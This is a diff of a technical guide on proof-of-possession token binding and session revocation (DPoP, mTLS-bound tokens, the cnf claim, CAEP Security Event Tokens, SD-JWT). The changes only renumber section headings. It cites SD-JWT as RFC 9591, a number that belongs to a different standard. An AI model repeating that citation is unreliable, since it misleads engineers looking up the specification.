-##### 38.2.2 Why Token Binding Failed
+##### 39.2.2 Why Token Binding Failed
 
 Token Binding was architecturally sound — it provided strong, transparent token binding at the transport layer. However, a combination of ecosystem factors prevented adoption:
 
@@ -43948,7 +43950,7 @@ Token Binding was architecturally sound — it provided strong, transparent toke
 
 **Complexity and lack of clear use case** — for OAuth 2.0 tokens, application-layer binding (DPoP) was simpler to implement and did not require TLS-layer changes. For web session cookies, the cookie theft threat was not yet perceived as acute enough (this changed after 2022 with the explosion of info-stealer malware). Token Binding occupied an awkward middle ground: too complex for web cookies, not targeted enough for API tokens.
 
-##### 38.2.3 Legacy Significance
+##### 39.2.3 Legacy Significance
 
 Token Binding's conceptual contribution endures: it established the architectural pattern of binding tokens to device-held cryptographic keys. Every subsequent mechanism — DPoP (§39.3), mTLS certificate-bound tokens (§39.4), and DBSC (§39.1) — implements the same fundamental idea using different (and more practical) technical approaches. The key lesson from Token Binding's failure is that **transport-layer binding is too tightly coupled to TLS implementation details**; application-layer binding (DPoP) and browser-native binding (DBSC) proved more deployable because they operate independently of the TLS version and the CDN/load balancer topology.
 
@@ -43962,7 +43964,7 @@ Token Binding's conceptual contribution endures: it established the architectura
 
 The most significant lesson is that **transport-layer binding is the wrong abstraction for PoP**. The internet's architecture assumes that intermediaries (CDNs, proxies, load balancers) can terminate and re-establish TLS connections without modifying application semantics. Any mechanism that violates this assumption faces an uphill deployment battle.
 
-##### 38.2.4 HTTP Message Signing (RFC 9421)
+##### 39.2.4 HTTP Message Signing (RFC 9421)
 
 The HTTP Message Signatures specification (RFC 9421), published in 2024, defines a cryptographic scheme for applying digital signatures over selected components of HTTP requests and responses. It supersedes the deprecated draft-cavage-http-signatures that saw limited adoption in early API platforms. Unlike OAuth-centric mechanisms such as DPoP (§39.3), HTTP Message Signing is a **general-purpose integrity and sender-authentication primitive** — it binds the identity of the signer to the content of the message itself (method, authority, path, headers, body digest) without presupposing any particular authorization framework. This makes it a foundational building block: DPoP (§39.3), mTLS certificate-bound tokens (§39.4), and the `cnf` claim binding pattern (§39.5) all address *token* constraint, whereas RFC 9421 addresses *message* constraint — a complementary but distinct concern.
 
@@ -44048,7 +44050,7 @@ Open source libraries exist in several languages (`http-message-signatures` in J
 **Transactional API request binding.** In financial and regulatory APIs, individual transactions must be non-repudiable. Signing the full request — method, path, query parameters, body digest, and content-type — creates a cryptographic audit trail. Unlike DPoP, which binds only the method and URI to the token, HTTP Message Signing can cover arbitrary header fields and the request body, providing the level of transactional integrity required by PSD2 and similar regulatory frameworks.
 
 #### 39.3 DPoP (RFC 9449): Sender-Constrained Tokens
-##### 38.3.1 Protocol Overview
+##### 39.3.1 Protocol Overview
 
 DPoP (Demonstrating Proof-of-Possession at the Application Layer) — RFC 9449 (September 2023) — is an OAuth 2.0 extension that binds access tokens and refresh tokens to a client-generated key pair. DPoP operates entirely at the **application layer** (HTTP headers) — independent of TLS version, CDN configuration, load balancer behaviour, or any transport-layer mechanism. This transport independence is DPoP's defining architectural advantage over Token Binding and mTLS.
 
@@ -44309,7 +44311,7 @@ If the `cnf.jkt` mathematically fails to flawlessly match the DPoP proof public 
 
 </details>
 
-##### 38.3.2 DPoP Proof JWT Structure
+##### 39.3.2 DPoP Proof JWT Structure
 
 The DPoP proof is a JWT with a specific structure. The **header** carries the signing algorithm and the public key:
 
@@ -44356,7 +44358,7 @@ The **payload** contains claims binding the proof to a specific HTTP request:
 | `iat` | Issued-at timestamp — the server rejects proofs with `iat` outside an acceptable window (typically ±60 seconds), limiting replay exposure |
 | `ath` | Access token hash — the base64url-encoded SHA-256 hash of the access token. Present when the proof accompanies an API call (not during the initial token request). Binds this specific proof to a specific access token |
 
-##### 38.3.3 Token Request with DPoP Proof
+##### 39.3.3 Token Request with DPoP Proof
 
 The client sends the DPoP proof in the `DPoP` HTTP header alongside the token request:
 
@@ -44408,7 +44410,7 @@ Inside the access token JWT, the `cnf` claim records the binding:
 \}
 ```
 
-##### 38.3.4 Resource Request with DPoP Proof
+##### 39.3.4 Resource Request with DPoP Proof
 
 When the client calls a resource server, it includes the access token in the `Authorization` header (with scheme `DPoP`, not `Bearer`) and a fresh DPoP proof in the `DPoP` header:
 
@@ -44436,7 +44438,7 @@ The validation flow can be expressed as a formal decision function:
 
 $$\text{valid}(r, p) = \begin{cases} \text{false} & \text{if } \text{sig}(p) \neq \text{verify}(p, \text{pk}(p)) \\ \text{false} & \text{if } p.\text{htm} \neq r.\text{method} \\ \text{false} & \text{if } p.\text{htu} \neq r.\text{uri} \\ \text{false} & \text{if } |p.\text{iat} - t_{\text{now}}| > \Delta t_{\max} \\ \text{false} & \text{if } p.\text{jti} \in \text{replay\_cache} \\ \text{false} & \text{if } \text{SHA-256}(r.\text{token}) \neq p.\text{ath} \\ \text{true} & \text{otherwise} \end{cases}$$
 
-##### 38.3.5 DPoP Nonce
+##### 39.3.5 DPoP Nonce
 
 The authorization server or resource server can require a **server-provided nonce** in the DPoP proof. When the server requires a nonce, it rejects the initial request with:
 
@@ -44474,7 +44476,7 @@ The client must include the server-provided nonce in the `nonce` claim of the ne
 
 The nonce mechanism is OPTIONAL for servers but RECOMMENDED for high-security deployments. It provides an additional layer of protection against proof replay attacks, particularly in scenarios where the `jti` replay cache might have gaps (e.g., distributed deployments with eventual consistency).
 
-##### 38.3.6 Adoption Status
+##### 39.3.6 Adoption Status
 
 DPoP has achieved production adoption across the major identity platforms:
 
@@ -44495,7 +44497,7 @@ DPoP has achieved production adoption across the major identity platforms:
 
 The adoption trend is clear: DPoP is rapidly becoming a standard feature in commercial identity platforms. The FAPI 2.0 requirement has been a significant accelerant — financial sector implementations (Open Banking, PSD2) must support DPoP, driving IdP vendors to prioritise implementation.
 
-##### 38.3.7 DPoP-Bound Refresh Tokens
+##### 39.3.7 DPoP-Bound Refresh Tokens
 
 DPoP binding applies to refresh tokens as well as access tokens. When the client sends the initial token request with a DPoP proof, the authorization server records the proof key's thumbprint alongside the refresh token in its token store. Every subsequent refresh request must include a DPoP proof signed by the same key — an attacker who steals the refresh token but does not possess the DPoP private key cannot use it to obtain new access tokens (RFC 9449, §10).
 
@@ -44514,7 +44516,7 @@ The binding is recorded in the introspection response for opaque refresh tokens:
 The authorization server validates the DPoP proof on every refresh request, comparing the proof's public key thumbprint against the stored `cnf.jkt`. If the thumbprints do not match — indicating the refresh request originates from a different client or a different device — the server rejects the request with `invalid_grant` and optionally revokes the entire token family (see §39.3.7 rotation detection). This theft protection model makes DPoP-bound refresh tokens significantly more resilient than bearer refresh tokens, where possession alone is sufficient.
 
 #### 39.4 mTLS Certificate-Bound Tokens (RFC 8705)
-##### 38.4.1 RFC 8705 Discovery, Endpoint Aliasing, and Validation Flow
+##### 39.4.1 RFC 8705 Discovery, Endpoint Aliasing, and Validation Flow
 
 At the transport layer, mutual TLS requires the server to request a client certificate (`CertificateRequest` in the TLS 1.2/1.3 handshake). If an API Gateway enforces this on the standard `https://auth.example.com/token` endpoint, all connecting clients will be prompted for a certificate. This breaks public clients (e.g., SPAs, mobile applications using PKCE) or confidential clients using shared secrets that do not possess X.509 infrastructure. Because the TLS handshake occurs before the HTTP payload is transmitted and parsed (preventing the Gateway from dynamically inspecting the `client_id` to determine if a cert is required), the architecture must isolate mTLS traffic at the TCP/ingress level.
 
@@ -44764,7 +44766,7 @@ Identifying strict hash alignment, the Resource Server proceeds with delivering 
 
 </details>
 
-##### 38.4.2 Cross-Reference to §24.2
+##### 39.4.2 Cross-Reference to §24.2
 
 mTLS certificate-bound access tokens were covered in depth in §24.2 (Mutual TLS Client Certificate Authentication) as the primary token binding mechanism for M2M communication. This section provides a concise summary and a comparative analysis with DPoP.
 
@@ -44785,7 +44787,7 @@ RFC 8705 defines certificate-bound access tokens: the authorization server embed
 
 The security property is equivalent to DPoP — the token is sender-constrained — but the binding mechanism operates at the TLS transport layer rather than the HTTP application layer.
 
-##### 38.4.3 DPoP vs. mTLS: When to Use Which
+##### 39.4.3 DPoP vs. mTLS: When to Use Which
 
 | Dimension | DPoP (RFC 9449) | mTLS (RFC 8705) |
 |:----------|:---------------|:----------------|
@@ -44832,7 +44834,7 @@ The security property is equivalent to DPoP — the token is sender-constrained 
 - High-throughput APIs where per-request JWT signing overhead is a concern
 - Deployments that already use mTLS for client authentication (RFC 8705 is an incremental addition)
 
-##### 38.4.4 mTLS-Bound Refresh Tokens
+##### 39.4.4 mTLS-Bound Refresh Tokens
 
 Certificate-bound refresh tokens extend the same mTLS binding to the refresh grant. The token endpoint requires mutual TLS, and the server verifies that the client certificate thumbprint matches the `cnf.x5t#S256` stored with the refresh token (RFC 8705). An attacker who steals a certificate-bound refresh token cannot use it without presenting the matching TLS client certificate at the token endpoint.
 
@@ -44845,11 +44847,11 @@ Certificate-bound refresh tokens extend the same mTLS binding to the refresh gra
 DPoP is the recommended binding for web and mobile applications — it requires no certificate infrastructure and operates at the application layer. mTLS is preferred for server-to-server (M2M) communication where certificate infrastructure is already in place and the TLS termination path is fully controlled.
 
 #### 39.5 The `cnf` (Confirmation) Claim (RFC 7800): Unified Binding Mechanism
-##### 38.5.1 RFC 7800: Proof-of-Possession Key Semantics for JWTs
+##### 39.5.1 RFC 7800: Proof-of-Possession Key Semantics for JWTs
 
 RFC 7800 (April 2016) defines the `cnf` (confirmation) claim as the single, unified mechanism for expressing proof-of-possession requirements in JWTs. The `cnf` claim is the authorization server's declaration: "this token is valid only when presented by an entity that can prove possession of the key identified by this claim." Every device-binding mechanism — DPoP, mTLS, DBSC, Token Binding — ultimately expresses its binding through the `cnf` claim.
 
-##### 38.5.2 `cnf` Claim Variants
+##### 39.5.2 `cnf` Claim Variants
 
 | Member | Value | Binding Type | Specification |
 |:-------|:------|:-------------|:-------------|
@@ -44862,7 +44864,7 @@ RFC 7800 (April 2016) defines the `cnf` (confirmation) claim as the single, unif
 
 The `jkt` (JWK Thumbprint) member is the most widely used in modern deployments — it is the DPoP binding identifier. The `x5t#S256` member is the mTLS binding identifier. Both achieve the same security property (sender constraining) using different key types and transport mechanisms, but share a common validation pattern at the JWT level.
 
-##### 38.5.3 Unified Validation Pattern
+##### 39.5.3 Unified Validation Pattern
 
 Resource servers follow a common validation logic regardless of binding type:
 
@@ -44931,7 +44933,7 @@ flowchart LR
     style Allow text-align:left
 ```
 
-##### 38.5.4 Tokens Without `cnf`: Bearer Tokens
+##### 39.5.4 Tokens Without `cnf`: Bearer Tokens
 
 If the access token contains no `cnf` claim, it is a bearer token — the resource server accepts it from any presenter without proof-of-possession. The `cnf` claim's presence or absence is the binary indicator of whether a token is sender-constrained or bearer.
 
@@ -44977,7 +44979,7 @@ Performance characteristics vary by mechanism, with TPM-backed operations adding
 
 The TPM involvement in DBSC and Token Binding adds 5–15ms of latency per request compared to in-memory signing (DPoP). This is generally acceptable for interactive web applications but may be a concern for high-frequency API calls where DPoP or mTLS is preferred.
 
-##### 38.6.1 Layering: Mechanisms are Complementary
+##### 39.6.1 Layering: Mechanisms are Complementary
 
 The binding mechanisms are not mutually exclusive — they operate at different layers of the session architecture and protect different token types. A high-security deployment combines them:
 
@@ -44993,7 +44995,7 @@ In the BFF architecture (§35.2):
 
 Every token in the chain is sender-constrained — there is no bearer credential anywhere in the architecture. Token theft at any layer is neutralised because the stolen token is inert without the corresponding private key.
 
-##### 38.6.2 The Industry Trajectory
+##### 39.6.2 The Industry Trajectory
 
 The industry is moving from Level 0 (bearer tokens everywhere) toward universal sender constraining:
 
@@ -45004,7 +45006,7 @@ The industry is moving from Level 0 (bearer tokens everywhere) toward universal 
 The transition is analogous to the shift from HTTP to HTTPS: initially opt-in and rare, then increasingly expected, eventually mandatory. Bearer tokens are the HTTP of session management — functional but fundamentally insecure. Sender-constrained tokens are the HTTPS — cryptographically bound to the legitimate holder.
 
 #### 39.7 Implementation Guidance
-##### 38.7.1 Choosing the Right Mechanism
+##### 39.7.1 Choosing the Right Mechanism
 
 The choice of PoP mechanism depends on the deployment context and threat model:
 
@@ -45026,7 +45028,7 @@ The choice of PoP mechanism depends on the deployment context and threat model:
 - DPoP is mandatory for FAPI 2.0 compliance
 - mTLS may be used as an additional transport-layer binding
 
-##### 38.7.2 DPoP Implementation Checklist
+##### 39.7.2 DPoP Implementation Checklist
 
 **Client-side:**
 
@@ -45058,7 +45060,7 @@ The choice of PoP mechanism depends on the deployment context and threat model:
 
 **Agent and workload considerations.** Autonomous agents (§25.2) are particularly well-suited for DPoP sender-constraining. Unlike browser-based clients, agents have unrestricted server-side key access — key generation, storage, and rotation are trivial using filesystem keystores, platform secret managers (HashiCorp Vault, AWS Secrets Manager), or HSMs. The computational overhead of per-request DPoP proof generation (a single ECDSA P-256 or Ed25519 signature) is negligible for machine-speed workloads that already handle TLS termination and JSON serialisation at far greater cost. The security payoff is proportionally higher: agents execute API calls at machine speed, making machine-speed token exfiltration a more severe threat than the manual replay attacks DPoP prevents for human users. In Kubernetes deployments, DPoP keys can be mounted from Secrets or generated per-pod at startup, ensuring each agent instance has a unique cryptographic identity.
 
-##### 38.7.3 DBSC Implementation Checklist
+##### 39.7.3 DBSC Implementation Checklist
 
 **Server-side:**
 
@@ -45074,7 +45076,7 @@ The choice of PoP mechanism depends on the deployment context and threat model:
 
 No client-side changes are required for DBSC — the browser handles key generation, proof signing, and header attachment transparently. The developer only needs to ensure the registration endpoint is correctly configured, cookie attributes include `Secure`, `HttpOnly`, and `SameSite=Strict`, and the server gracefully handles requests without DBSC proof (for non-TPM devices).
 
-##### 38.7.4 Common Pitfalls
+##### 39.7.4 Common Pitfalls
 
 | Pitfall | Mechanism | Impact | Mitigation |
 |:--------|:----------|:-------|:-----------|
@@ -46151,19 +46153,19 @@ Multi-tab synchronization introduces race conditions that must be handled carefu
 #### 40.14 Cross-Domain Session Revocation Propagation
 DR-0003's §38 covers session revocation extensively (direct revocation, backchannel logout, frontchannel logout). This section addresses a harder problem: propagating a revocation signal across **independent domains** — services that have their own authentication systems and have independently issued sessions for the same user.
 
-##### 39.14.1 The Cross-Domain Revocation Problem
+##### 40.14.1 The Cross-Domain Revocation Problem
 
 Consider this scenario: Alice authenticates with her corporate IdP (Azure AD) and gets sessions at Service A (Jira), Service B (Slack), and Service C (GitHub). Alice's IT admin detects suspicious activity on her account and revokes her session at the IdP. The IdP can propagate this revocation to Jira, Slack, and GitHub *if* they participate in the same federation (via OpenID Connect Back-Channel Logout). But what about Service D, an independent SaaS application where Alice authenticated with her email and password (not via the corporate IdP)? Service D has no knowledge of Alice's session revocation.
 
 This is fundamentally a **notification problem**: how do independent domains learn about security events that affect sessions they have independently issued?
 
-##### 39.14.2 Approaches That Don't Scale
+##### 40.14.2 Approaches That Don't Scale
 
 - **Email notification.** "We detected suspicious activity. Please log out of all services." Relies on user action, not automated.
 - **Browser-based broadcast.** `BroadcastChannel` API works within the same origin, not cross-origin.
 - **Webhooks between arbitrary domains.** Requires pre-registered trust relationships — not realistic for independent services.
 
-##### 39.14.3 Effective Approaches
+##### 40.14.3 Effective Approaches
 
 **Backchannel logout (within a federation).** OpenID Connect Back-Channel Logout 1.0 (§40.4) is the standard solution for federated environments. The IdP pushes logout tokens to each RP via a registered backchannel URI. This works well but requires all parties to be in the same federation.
 
@@ -46175,7 +46177,7 @@ RISC is limited to the Google ecosystem but demonstrates the pattern that a stan
 
 **Token introspection at session validation time.** If sessions are backed by tokens (JWT or opaque), the RP can validate the token's revocation status on every request (or every N requests) by calling the issuer's introspection endpoint. This provides near-real-time revocation but adds latency to every request.
 
-##### 39.14.4 Practical Recommendations
+##### 40.14.4 Practical Recommendations
 
 | Scenario | Recommended Approach |
 |:---------|:---------------------|
@@ -46252,7 +46254,7 @@ Critical events should bypass any batching or deduplication logic and be process
 
 The JWT revocation problem (§37.3.4) stems from a fundamental architectural tension: JWTs are self-contained and validated statelessly, yet revocation inherently requires state. Three conventional strategies each impose a distinct trade-off — short lifetimes cap exposure but degrade user experience; token blacklists (deny-lists of revoked `jti` values) reintroduce server-side state on every request; token version claims provide per-user granularity but cannot target individual sessions. CAEP resolves this tension by decoupling the revocation signal from the token lifecycle entirely. When a session termination event occurs, the IdP publishes a CAEP `session-revoked` event through the SSF, all subscribed Relying Parties receive the SET, and each RP adds the affected JWT's `jti` to a local deny-list or invalidates the session — achieving near-real-time revocation without polling the IdP or requiring per-request introspection (RFC 7662). This event-driven model (sometimes called Strategy 4 in JWT revocation taxonomies) provides immediate revocation while preserving the stateless validation benefit of JWTs for the vast majority of requests that do not involve a revoked token.
 
-##### 40.1.1 Enforcement Latency Model
+##### 41.1.1 Enforcement Latency Model
 
 The time from revocation event to enforcement can be modelled as:
 
@@ -46266,7 +46268,7 @@ Where:
 
 For a well-configured SSF deployment, the total enforcement latency is typically under 500 ms, compared to the 0–60 minute exposure window of static tokens.
 
-##### 40.1.2 Event Delivery via SETs (RFC 8417)
+##### 41.1.2 Event Delivery via SETs (RFC 8417)
 
 CAEP events are packaged and systematically delivered as **Security Event Tokens (SETs)**. Formally defined in RFC 8417, a SET is a JSON Web Token (JWT) specifically structured to convey discrete security states rather than static identity claims. The JWT header specifies the signing algorithm and key:
 
@@ -46322,7 +46324,7 @@ The following table documents all SET claims defined by RFC 8417:
 
 The `events` claim is the core of the SET — a JSON object where each key is an event type URI and each value is the event-type-specific payload. Multiple events can be bundled in a single SET, although best practice is one event per SET for processing clarity.
 
-##### 40.1.3 SET Validation Checklist
+##### 41.1.3 SET Validation Checklist
 
 When a Receiver receives a SET, it must perform the following validation steps before processing the event:
 
@@ -46376,7 +46378,7 @@ flowchart LR
     style Drop text-align:left
 ```
 
-##### 40.1.4 SET Signature Algorithms
+##### 41.1.4 SET Signature Algorithms
 
 SETs must be signed using an asymmetric algorithm. The following algorithms are permitted per RFC 8417:
 
@@ -46440,7 +46442,7 @@ flowchart LR
     style Rx2 text-align:left
 ```
 
-##### 40.2.1 SSF Subject Identifiers
+##### 41.2.1 SSF Subject Identifiers
 
 A massive hurdle in inter-organizational security telemetry is agreeing on who a user is. SSF resolves this by standardizing subject identification formats, allowing a Transmitter to unambiguously reference a user regardless of how the Receiver internally models or stores identities.
 
@@ -46470,7 +46472,7 @@ The choice of format affects privacy, portability, and correlation accuracy:
 | `phone_number` | Low (directly identifying) | Medium (carrier portability issues) | Mobile-centric identity scenarios |
 | `opaque` | High (no correlation possible) | Low (single transmitter only) | Stream-level identifiers; privacy-sensitive contexts |
 
-##### 40.2.2 Delivery Mechanisms and Stream Management
+##### 41.2.2 Delivery Mechanisms and Stream Management
 
 SSF supports two distinct delivery topologies, catering to disparate network constraints:
 
@@ -46484,7 +46486,7 @@ SSF supports two distinct delivery topologies, catering to disparate network con
 
 To establish these pipelines, the Transmitter publishes a standardized metadata document at the `/.well-known/ssf-configuration` endpoint. This configuration exposes supported event types, signature algorithms, and the URIs for its dynamic stream management APIs. Receivers utilize these REST APIs (executing authenticated POST and DELETE requests) to dynamically add or remove specific subjects from their observation stream, ensuring they only receive telemetry for users actively logged into their platform.
 
-##### 40.2.3 Stream Management REST API
+##### 41.2.3 Stream Management REST API
 
 The SSF Stream Management API provides the control plane for the publisher-subscriber relationship. It allows the Receiver to programmatically dictate exactly what telemetry it wants to consume, preventing the Transmitter from needlessly spraying events for users who have no active session with the Receiver.
 
@@ -46997,11 +46999,11 @@ Content-Type: application/json
 #### 41.7 SD-JWT as the Industry-Standard Verifiable Credential Format
 DR-0003's §31.1 covers OpenID4VP and OpenID4VCI, which carry verifiable credentials. This section provides a deeper look at SD-JWT (Selective Disclosure JSON Web Token), the IETF standard (RFC 9591) that has become the de facto format for verifiable credentials in OpenID4VP and OpenID4VCI implementations.
 
-##### 40.7.1 Why SD-JWT Matters for Session Management
+##### 41.7.1 Why SD-JWT Matters for Session Management
 
 At first glance, SD-JWT may seem unrelated to session management. However, as continuous access evaluation (CAEP, §41) and real-time session authorization evolve, verifiable credentials are increasingly used to make authorization decisions within a session. An RP may verify a user's employment status, age, or regulatory clearance *during* a session — not just at login time. SD-JWT's selective disclosure properties are critical for these in-session verification checks, as they allow the RP to request specific claims without receiving the entire credential.
 
-##### 40.7.2 SD-JWT Technical Overview
+##### 41.7.2 SD-JWT Technical Overview
 
 An SD-JWT consists of three concatenated parts:
 
@@ -47021,7 +47023,7 @@ The verification process:
 
 This process proves that the disclosed claims were originally issued by the issuer, even though the holder chose which claims to reveal.
 
-##### 40.7.3 SD-JWT in Continuous Access Evaluation
+##### 41.7.3 SD-JWT in Continuous Access Evaluation
 
 In a CAEP-enabled session (§41), the RP may periodically request the holder to present specific claims from their verifiable credentials:
 
@@ -47038,7 +47040,7 @@ This pattern enables **real-time, fine-grained authorization** within sessions, 
 #### 41.8 Verifiable Credential Revocation and Status Management
 Verifiable credentials, unlike traditional session tokens, can have lifetimes of years. A university diploma might be valid for a lifetime; a professional certification might expire annually; an employee credential should be revoked immediately upon termination. Revocation management is therefore a critical infrastructure requirement for any VC deployment.
 
-##### 40.8.1 Revocation Mechanisms
+##### 41.8.1 Revocation Mechanisms
 
 **Status List (IETF Bitstring Status List).**
 
@@ -47069,7 +47071,7 @@ Some VC implementations use cryptographic accumulators (Merkle trees, RSA accumu
 
 Accumulator-based revocation is more complex to implement but provides stronger privacy guarantees than status lists. It is used in the Hyperledger AnonCreds ecosystem and the EU EBSI wallet.
 
-##### 40.8.2 Revocation in Practice
+##### 41.8.2 Revocation in Practice
 
 | Mechanism | Privacy | Performance | Complexity | Adoption |
 |:----------|:--------:|:-----------:|:----------:|:--------:|
